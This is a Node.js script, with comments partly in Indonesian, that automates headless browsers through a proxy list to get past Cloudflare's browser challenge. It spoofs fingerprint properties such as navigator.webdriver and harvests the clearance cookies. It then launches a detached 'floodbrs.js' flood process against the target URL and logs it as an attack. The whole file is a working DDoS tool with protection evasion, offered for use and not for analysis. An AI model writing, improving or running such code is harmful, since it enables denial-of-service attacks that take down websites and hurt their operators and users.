const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const UserAgent = require('user-agents');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COLORS = {
    RED: '\x1b[31m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    CYAN: '\x1b[36m',
    RESET: '\x1b[0m'
};

// Utility functions
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const coloredLog = (color, text) => console.log(`${color}${text}${COLORS.RESET}`);
const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    return parts.length >= 2 ? `${parts[0]}.${parts[1]}.**.**:****` : proxy;
};

// Command-line arguments
const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

// Read proxies
const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        coloredLog(COLORS.RED, 'Error reading proxies file');
        return [];
    }
};

// Generate realistic user agent
const generateUserAgent = () => {
    const userAgent = new UserAgent({ deviceCategory: 'desktop' });
    return userAgent.toString();
};

// NEW: Advanced Cloudflare solver dengan pendekatan berbeda
const solveCloudflareChallenge = async (page, proxy) => {
    try {
        coloredLog(COLORS.WHITE, `[SOLVER] Advanced approach: ${maskProxy(proxy)}`);
        
        // Tunggu initial load
        await sleep(3000);
        
        let title = await page.title().catch(() => '');
        let currentUrl = page.url();
        
        coloredLog(COLORS.CYAN, `[SOLVER] Initial state: ${title}`);
        
        // Cek jika sudah berhasil
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: No challenge detected`);
            return { success: true, method: 'no_challenge' };
        }
        
        coloredLog(COLORS.YELLOW, `[SOLVER] Cloudflare detected, using advanced methods...`);
        
        // METHOD 1: Biarkan Cloudflare solve sendiri (paling efektif)
        coloredLog(COLORS.WHITE, `[SOLVER] Method 1: Letting Cloudflare auto-solve (30s)`);
        
        for (let i = 0; i < 30; i++) {
            await sleep(1000);
            
            title = await page.title().catch(() => '');
            currentUrl = page.url();
            
            // Check multiple success conditions
            if (!title.includes('Just a moment') && 
                !title.includes('Checking your browser') &&
                !currentUrl.includes('challenge') &&
                !currentUrl.includes('cdn-cgi')) {
                coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Auto-solved after ${i + 1}s`);
                return { success: true, method: 'auto_solve' };
            }
            
            // Occasionally check page content
            if (i % 5 === 0) {
                const content = await page.content().catch(() => '');
                if (content.includes('cf-browser-verification') || content.includes('cf_captcha_kind')) {
                    coloredLog(COLORS.CYAN, `[SOLVER] Still in challenge at ${i + 1}s`);
                }
            }
        }
        
        // METHOD 2: Coba interaksi natural dengan halaman
        coloredLog(COLORS.WHITE, `[SOLVER] Method 2: Natural interaction`);
        
        // Scroll sedikit
        await page.evaluate(() => window.scrollBy(0, 200));
        await sleep(1000);
        
        // Cari elemen yang mungkin jadi tombol challenge
        const possibleElements = await page.$$('input, button, a, [role="button"], [onclick]');
        coloredLog(COLORS.CYAN, `[SOLVER] Found ${possibleElements.length} interactive elements`);
        
        for (let i = 0; i < Math.min(possibleElements.length, 5); i++) {
            try {
                const element = possibleElements[i];
                const tagName = await element.evaluate(el => el.tagName.toLowerCase());
                const type = await element.evaluate(el => el.type || '');
                const value = await element.evaluate(el => el.value || '');
                
                // Hanya klik elemen yang mungkin tombol challenge
                if (tagName === 'input' && type === 'submit' || 
                    tagName === 'button' ||
                    value.includes('Verify') || value.includes('Continue')) {
                    
                    coloredLog(COLORS.CYAN, `[SOLVER] Clicking ${tagName} with value: ${value}`);
                    
                    // Scroll ke element
                    await element.evaluate(el => el.scrollIntoView({ behavior: 'smooth', block: 'center' }));
                    await sleep(500);
                    
                    // Klik element
                    await element.click();
                    await sleep(8000);
                    
                    // Check result
                    title = await page.title().catch(() => '');
                    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                        coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Element click worked`);
                        return { success: true, method: 'element_click' };
                    }
                }
            } catch (e) {
                // Continue to next element
            }
        }
        
        // METHOD 3: Coba navigasi ulang dengan referrer
        coloredLog(COLORS.WHITE, `[SOLVER] Method 3: Navigation with referrer`);
        
        await page.goto(targetURL, {
            waitUntil: 'networkidle0',
            timeout: 30000,
            referer: targetURL
        });
        
        await sleep(10000);
        
        title = await page.title().catch(() => '');
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Navigation worked`);
            return { success: true, method: 'navigation' };
        }
        
        coloredLog(COLORS.RED, `[SOLVER] FAILED: All advanced methods exhausted`);
        return { success: false, method: 'failed' };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[SOLVER] ERROR: ${error.message}`);
        return { success: false, method: 'error' };
    }
};

// NEW: Enhanced browser configuration
const createBrowser = async (proxy) => {
    const userAgent = generateUserAgent();
    
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--disable-gpu',
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-background-timer-throttling',
        '--disable-renderer-backgrounding',
        '--disable-backgrounding-occluded-windows',
        '--disable-ipc-flooding-protection',
        '--disable-features=TranslateUI,BlinkGenPropertyTrees',
        '--enable-features=NetworkService,NetworkServiceInProcess',
        '--ignore-certificate-errors',
        '--ignore-ssl-errors',
        '--disable-web-security',
        '--disable-site-isolation-trials',
        '--disable-default-apps',
        '--disable-extensions',
        '--disable-translate',
        '--no-pings',
        '--use-gl=swiftshader',
        '--disable-software-rasterizer',
        '--disable-background-networking',
        '--disable-sync',
        '--disable-hang-monitor',
        '--disable-prompt-on-repost',
        '--disable-domain-reliability',
        '--disable-component-update',
        '--aggressive-cache-discard',
        '--max_old_space_size=4096',
        '--window-size=1920,1080',
        `--user-agent=${userAgent}`
    ];

    return await puppeteer.launch({
        headless: true,
        args: args,
        ignoreHTTPSErrors: true
    });
};

// NEW: Advanced stealth setup
const setupStealth = async (page) => {
    // Set random viewport
    await page.setViewport({
        width: 1920 + Math.floor(Math.random() * 100),
        height: 1080 + Math.floor(Math.random() * 100),
        deviceScaleFactor: 1,
        isMobile: false,
        hasTouch: false,
        isLandscape: true
    });

    // Set extra headers
    await page.setExtraHTTPHeaders({
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1'
    });

    // Enhanced evasion
    await page.evaluateOnNewDocument(() => {
        // Plugin evasion
        Object.defineProperty(navigator, 'plugins', {
            get: () => [1, 2, 3, 4, 5]
        });

        // Language evasion
        Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en']
        });

        // Webdriver evasion
        Object.defineProperty(navigator, 'webdriver', {
            get: () => false
        });

        // Chrome evasion
        window.chrome = {
            runtime: {},
            loadTimes: () => ({}),
            csi: () => ({}),
            app: {}
        };

        // Permissions evasion
        const originalQuery = navigator.permissions.query;
        navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
        );
    });
};

// Extract cookies
const extractCookies = async (page) => {
    try {
        await sleep(2000);
        const cookies = await page.cookies();
        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        // Filter Cloudflare cookies
        const cfCookies = cookies.filter(cookie => 
            cookie.name.includes('cf_') || 
            cookie.name.includes('_cf')
        );
        
        coloredLog(COLORS.GREEN, `[COOKIES] Extracted ${cookies.length} total, ${cfCookies.length} Cloudflare cookies`);
        return { success: true, cookies: cookieString };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[COOKIES] ERROR: ${error.message}`);
        return { success: false, cookies: '' };
    }
};

// Main browser function
const launchBrowser = async (targetURL, proxy, index, total) => {
    let browser;
    try {
        coloredLog(COLORS.YELLOW, `[BROWSER ${index}/${total}] Launching: ${maskProxy(proxy)}`);
        
        browser = await createBrowser(proxy);
        const page = await browser.newPage();
        
        // Setup stealth
        await setupStealth(page);
        
        // Navigate dengan timeout lebih lama
        coloredLog(COLORS.WHITE, `[BROWSER ${index}/${total}] Navigating...`);
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0',
            timeout: 45000 
        });
        
        // Solve challenge
        const challengeResult = await solveCloudflareChallenge(page, proxy);
        
        if (!challengeResult.success) {
            throw new Error(`Challenge failed: ${challengeResult.method}`);
        }
        
        coloredLog(COLORS.GREEN, `[SUCCESS ${index}/${total}] Solved via ${challengeResult.method}`);
        
        // Extract cookies
        const cookieResult = await extractCookies(page);
        
        if (cookieResult.success && cookieResult.cookies) {
            // Launch flood process
            const floodProcess = spawn('node', [
                'floodbrs.js',
                targetURL,
                duration.toString(),
                rate,
                '1',
                proxyFile,
                cookieResult.cookies,
                generateUserAgent(),
                'cf-session-key'
            ], {
                detached: true,
                stdio: 'ignore'
            });
            
            floodProcess.unref();
            coloredLog(COLORS.GREEN, `[ATTACK ${index}/${total}] Flood process started`);
        }
        
        await browser.close();
        return { success: true, method: challengeResult.method };
        
    } catch (error) {
        if (browser) await browser.close();
        coloredLog(COLORS.RED, `[BROWSER ${index}/${total}] ERROR: ${error.message}`);
        return { success: false, error: error.message };
    }
};

// Main execution dengan rate limiting
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[ERROR] No proxies found');
        return;
    }

    coloredLog(COLORS.GREEN, `[START] Advanced Cloudflare solver with ${proxies.length} proxies`);
    
    const results = {
        success: 0,
        failed: 0,
        methods: {}
    };
    
    // Process dengan concurrency terbatas
    const concurrency = 2; // Max 2 browser bersamaan
    const delayBetweenBatches = 10000; // 10 detik antara batch
    
    for (let i = 0; i < proxies.length; i += concurrency) {
        const batch = proxies.slice(i, i + concurrency);
        coloredLog(COLORS.CYAN, `[BATCH] Processing ${i + 1}-${i + batch.length} of ${proxies.length}`);
        
        const batchPromises = batch.map((proxy, batchIndex) => 
            launchBrowser(targetURL, proxy, i + batchIndex + 1, proxies.length)
        );
        
        const batchResults = await Promise.all(batchPromises);
        
        // Update results
        batchResults.forEach(result => {
            if (result.success) {
                results.success++;
                results.methods[result.method] = (results.methods[result.method] || 0) + 1;
            } else {
                results.failed++;
            }
        });
        
        coloredLog(COLORS.WHITE, `[STATUS] Success: ${results.success}, Failed: ${results.failed}`);
        
        // Delay antara batch kecuali batch terakhir
        if (i + concurrency < proxies.length) {
            coloredLog(COLORS.CYAN, `[BATCH] Waiting ${delayBetweenBatches/1000}s before next batch...`);
            await sleep(delayBetweenBatches);
        }
    }
    
    // Final report
    coloredLog(COLORS.GREEN, `[FINAL] Completed: ${results.success} successful, ${results.failed} failed`);
    coloredLog(COLORS.GREEN, `[FINAL] Success rate: ${((results.success/proxies.length)*100).toFixed(1)}%`);
    coloredLog(COLORS.CYAN, `[METHODS] ${JSON.stringify(results.methods, null, 2)}`);
    
    // Wait for attack duration
    coloredLog(COLORS.YELLOW, `[ATTACK] Running for ${duration} seconds...`);
    await sleep(duration * 1000);
    coloredLog(COLORS.YELLOW, '[SHUTDOWN] Attack completed');
};

// Handle process exit
process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Stopping gracefully...');
    process.exit(0);
});

coloredLog(COLORS.GREEN, '[READY] 🚀 ULTIMATE CLOUDFLARE BYPASS STARTED 🚀');
main().catch(err => {
    coloredLog(COLORS.RED, `[MAIN ERROR] ${err.message}`);
});
